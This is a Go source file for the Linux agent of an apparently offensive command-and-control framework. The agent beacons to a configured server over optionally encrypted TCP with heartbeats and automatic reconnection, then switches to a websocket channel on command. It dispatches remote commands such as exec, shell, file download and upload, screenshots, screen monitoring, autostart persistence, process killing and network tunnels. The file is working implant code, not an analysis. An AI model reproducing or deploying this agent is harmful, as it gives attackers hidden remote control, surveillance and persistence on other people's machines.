//go:build linux

package linuxagent

import (
	"bufio"
	"encoding/json"
	"fmt"
	"net"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/gorilla/websocket"

	"c2/internal/jsonutil"
)

func diagQuiet() bool {
	q := strings.TrimSpace(os.Getenv("C2_AGENT_QUIET"))
	return q == "1" || strings.EqualFold(q, "true") || strings.EqualFold(q, "yes")
}

func diagReplyPreview(s string) string {
	const max = 240
	if len(s) <= max {
		return s
	}
	return s[:max] + fmt.Sprintf("…(%d bytes)", len(s))
}

type Agent struct {
	bc BootConfig

	tcp   net.Conn
	br    *bufio.Reader
	tcpMu sync.Mutex

	ws      *websocket.Conn
	wsMu    sync.Mutex
	useWS   atomic.Bool
	running atomic.Bool

	tunnelMu sync.Mutex
	tunnels  map[string]net.Conn
}

func Run(bc BootConfig) error {
	if bc.HB <= 0 {
		bc.HB = 30
	}
	if bc.WebPort <= 0 {
		bc.WebPort = 8080
	}
	if bc.WebHost == "" {
		bc.WebHost = "127.0.0.1"
	}

	bootLogged := false
	for {
		if !bootLogged && !diagQuiet() {
			fmt.Fprintf(os.Stderr, "[c2-agent] boot tcp=%s:%d web=%s:%d traffic_enc=%v (set C2_AGENT_QUIET=1 to silence this line)\n",
				bc.ServerHost, bc.ServerPort, bc.WebHost, bc.WebPort, useEncryption(bc.VKey, bc.Salt))
			bootLogged = true
		}
		a := &Agent{
			bc:      bc,
			tunnels: make(map[string]net.Conn),
		}
		a.running.Store(true)
		addr := net.JoinHostPort(bc.ServerHost, strconv.Itoa(bc.ServerPort))
		if !diagQuiet() {
			fmt.Fprintf(os.Stderr, "[c2-agent] dial tcp %s (30s timeout)...\n", addr)
		}
		conn, err := net.DialTimeout("tcp", addr, 30*time.Second)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[c2-agent] ERROR tcp dial %s failed: %v — check listener is started, firewall, and ExternalAddr is reachable from this host (retry in 30s)\n", addr, err)
			time.Sleep(30 * time.Second)
			continue
		}
		if !diagQuiet() {
			fmt.Fprintf(os.Stderr, "[c2-agent] tcp ok, sending register...\n")
		}
		a.tcp = conn
		a.br = bufio.NewReader(conn)

		reg := collectRegisterFields(bc)
		regLine, err := jsonutil.MarshalCompact(reg)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[c2-agent] ERROR marshal register: %v\n", err)
			_ = conn.Close()
			time.Sleep(30 * time.Second)
			continue
		}
		if err := a.writeLineTCP(regLine); err != nil {
			fmt.Fprintf(os.Stderr, "[c2-agent] ERROR write register: %v\n", err)
			_ = conn.Close()
			time.Sleep(30 * time.Second)
			continue
		}

		_ = conn.SetReadDeadline(time.Now().Add(15 * time.Second))
		resp, err := a.readLineRaw()
		if err != nil {
			fmt.Fprintf(os.Stderr, "[c2-agent] ERROR read register ack: %v — if using encryption, VKey/Salt on listener must match payload\n", err)
			_ = conn.Close()
			time.Sleep(30 * time.Second)
			continue
		}
		if !strings.Contains(resp, "registered") {
			fmt.Fprintf(os.Stderr, "[c2-agent] ERROR register rejected (reply has no 'registered'): %q\n", diagReplyPreview(resp))
			fmt.Fprintf(os.Stderr, "[c2-agent] hint: same listener as payload; enc=%v; wrong port (web vs c2 tcp) also breaks here\n", useEncryption(bc.VKey, bc.Salt))
			_ = conn.Close()
			time.Sleep(30 * time.Second)
			continue
		}
		_ = conn.SetReadDeadline(time.Time{})

		if !diagQuiet() {
			fmt.Fprintf(os.Stderr, "[c2-agent] registered OK, entering session loop\n")
		}

		go a.heartbeatLoop()

		a.tcpControlLoop()

		if !diagQuiet() {
			fmt.Fprintf(os.Stderr, "[c2-agent] session ended, reconnect in 30s\n")
		}

		a.useWS.Store(false)
		a.wsMu.Lock()
		if a.ws != nil {
			_ = a.ws.Close()
			a.ws = nil
		}
		a.wsMu.Unlock()
		_ = conn.Close()
		time.Sleep(30 * time.Second)
	}
}

func (a *Agent) enc() bool {
	return useEncryption(a.bc.VKey, a.bc.Salt)
}

func (a *Agent) readLineRaw() (string, error) {
	line, err := a.br.ReadBytes('\n')
	if err != nil {
		return "", err
	}
	s := strings.TrimSpace(string(line))
	if !a.enc() {
		return s, nil
	}
	dec, err := DecryptLine(s, a.bc.VKey, a.bc.Salt)
	if err != nil {
		return "", err
	}
	return strings.TrimSpace(string(dec)), nil
}

func (a *Agent) readLineTCPTimeout(d time.Duration) (string, error) {
	if err := a.tcp.SetReadDeadline(time.Now().Add(d)); err != nil {
		return "", err
	}
	s, err := a.readLineRaw()
	_ = a.tcp.SetReadDeadline(time.Time{})
	return s, err
}

func parseFlatMessage(line string) map[string]string {
	var raw map[string]interface{}
	if err := json.Unmarshal([]byte(line), &raw); err != nil {
		return nil
	}
	out := make(map[string]string)
	for k, v := range raw {
		switch t := v.(type) {
		case string:
			out[k] = t
		case float64:
			out[k] = strconv.FormatInt(int64(t), 10)
		case bool:
			if t {
				out[k] = "true"
			} else {
				out[k] = "false"
			}
		default:
			out[k] = fmt.Sprint(t)
		}
	}
	return out
}

func (a *Agent) dispatchFromWS(line string) {
	msg := parseFlatMessage(line)
	if msg == nil {
		return
	}
	t := msg["type"]
	id := msg["id"]
	if t == "list_dir" || t == "list_dir_children" {
		a.handleCommand(id, t, msg, false)
		return
	}
	if isAsyncCommand(t) {
		go a.handleCommand(id, t, msg, false)
	}
}

func (a *Agent) tcpControlLoop() {
	for a.running.Load() {
		line, err := a.readLineTCPTimeout(60 * time.Second)
		if err != nil || line == "" {
			if !a.running.Load() {
				return
			}
			if a.useWS.Load() {
				continue
			}
			continue
		}
		msg := parseFlatMessage(line)
		if msg == nil {
			continue
		}
		if msg["type"] == "signal" && msg["action"] == "open_ws" {
			go a.connectAgentWS(msg["token"], msg["web_host"], msg["web_port"])
			continue
		}
		if a.useWS.Load() {
			continue
		}
		t := msg["type"]
		id := msg["id"]
		go a.handleCommand(id, t, msg, true)
	}
}

func isAsyncCommand(t string) bool {
	switch t {
	case "exec", "shell", "mkdir", "download", "upload", "process_list", "kill_process",
		"screenshot", "screen_monitor_start", "screen_monitor_stop",
		"autostart_set", "autostart_remove", "disconnect",
		"tunnel_connect", "tunnel_data",
		"shell_session_create", "shell_session_write", "shell_session_close":
		return true
	default:
		return false
	}
}

func (a *Agent) connectAgentWS(token, webHost, webPortStr string) {
	host := resolveWebHost(a.bc, webHost)
	port := a.bc.WebPort
	if webPortStr != "" {
		if p, err := strconv.Atoi(webPortStr); err == nil && p > 0 {
			port = p
		}
	}
	u := url.URL{
		Scheme: "ws",
		Host:   net.JoinHostPort(host, strconv.Itoa(port)),
		Path:   "/ws/agent",
	}
	q := url.Values{}
	q.Set("token", token)
	u.RawQuery = q.Encode()

	d := websocket.Dialer{HandshakeTimeout: 15 * time.Second}
	conn, _, err := d.Dial(u.String(), nil)
	if err != nil {
		if !diagQuiet() {
			fmt.Fprintf(os.Stderr, "[c2-agent] ws /ws/agent dial failed: %v (file/terminal may stay on TCP only)\n", err)
		}
		return
	}
	a.wsMu.Lock()
	if a.ws != nil {
		_ = a.ws.Close()
	}
	a.ws = conn
	a.wsMu.Unlock()
	a.useWS.Store(true)

	for a.running.Load() && a.useWS.Load() {
		_, data, err := conn.ReadMessage()
		if err != nil {
			break
		}
		a.dispatchFromWS(string(data))
	}

	a.useWS.Store(false)
	a.wsMu.Lock()
	if a.ws == conn {
		_ = conn.Close()
		a.ws = nil
	}
	a.wsMu.Unlock()
}

func resolveWebHost(bc BootConfig, wh string) string {
	h := strings.TrimSpace(wh)
	if h == "" {
		h = bc.WebHost
	}
	if h == "127.0.0.1" || h == "localhost" || h == "::1" {
		if bc.WebHost != "" && bc.WebHost != "127.0.0.1" && bc.WebHost != "localhost" {
			return bc.WebHost
		}
		return bc.ServerHost
	}
	return h
}

func (a *Agent) channelSend(payload []byte) {
	if a.useWS.Load() {
		a.wsMu.Lock()
		w := a.ws
		if w != nil {
			_ = w.WriteMessage(websocket.TextMessage, payload)
		}
		a.wsMu.Unlock()
		return
	}
	_ = a.writeLineTCP(payload)
}

func (a *Agent) channelSendCommandResponse(payload []byte, replyTCP bool) {
	if replyTCP {
		_ = a.writeLineTCP(payload)
		return
	}
	if a.useWS.Load() {
		a.wsMu.Lock()
		w := a.ws
		if w != nil {
			_ = w.WriteMessage(websocket.TextMessage, payload)
		}
		a.wsMu.Unlock()
		return
	}
	_ = a.writeLineTCP(payload)
}

func (a *Agent) heartbeatLoop() {
	t := time.Duration(a.bc.HB) * time.Second
	if t <= 0 {
		t = 30 * time.Second
	}
	val := 0
	for a.running.Load() {
		time.Sleep(t)
		if !a.running.Load() {
			return
		}
		val++
		msg := map[string]string{
			"type":  "heartbeat",
			"value": strconv.Itoa(val),
		}
		if wd, err := os.Getwd(); err == nil && wd != "" {
			msg["working_dir"] = wd
		}
		b, _ := jsonutil.MarshalCompact(msg)
		a.tcpMu.Lock()
		_ = a.writeLineTCPUnlocked(b)
		a.tcpMu.Unlock()
	}
}

func (a *Agent) writeLineTCPUnlocked(payload []byte) error {
	content := append(append([]byte{}, payload...), '\n')
	if a.enc() {
		s, err := EncryptLine(content, a.bc.VKey, a.bc.Salt)
		if err != nil {
			return err
		}
		_, err = fmt.Fprintf(a.tcp, "%s\n", s)
		return err
	}
	_, err := a.tcp.Write(content)
	return err
}

func (a *Agent) writeLineTCP(payload []byte) error {
	a.tcpMu.Lock()
	defer a.tcpMu.Unlock()
	return a.writeLineTCPUnlocked(payload)
}
